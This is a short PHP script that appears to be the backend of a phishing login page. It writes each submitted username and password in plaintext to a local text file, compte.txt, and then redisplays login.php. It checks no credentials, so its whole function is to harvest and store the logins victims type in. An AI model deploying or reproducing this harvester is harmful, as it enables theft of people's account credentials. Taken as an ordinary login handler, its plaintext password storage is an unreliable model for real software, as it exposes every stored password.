<?php
$texte='';

	$texte=fopen("compte.txt","a+");
	fwrite($texte,($_POST["user"])."<br/>".($_POST["password"])."<br/>");
	fclose($texte);
	
	include("login.php");
	
	?>